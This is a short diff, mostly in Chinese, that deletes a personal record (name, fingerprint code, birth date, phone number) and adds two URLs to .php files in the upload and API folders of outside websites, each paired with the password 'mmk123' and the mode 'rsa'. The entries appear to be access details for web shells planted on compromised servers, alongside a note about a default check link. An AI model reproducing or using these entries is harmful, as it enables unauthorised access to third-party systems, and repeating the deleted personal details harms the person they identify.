@@ -1,19 +1,9 @@
-英文名： mawang
-指纹编码：167010
-职级： 普通员工
-性别： 男
-生日: 1995-7-1
-国籍： 香港
-电话: 09310208996
-接电话时间： 12:00 - 24:00
 
 
 
 
 
-
-
-改过的
+改过的  默认检查链接 域名/doo.php
 
 http://sbckj.com/static/upload/other/20230610/1.php |mmk123 |rsa  
 http://pindu812.ip9g2.51jz.top/apps/api/model/1m.php |mmk123 |rsa   
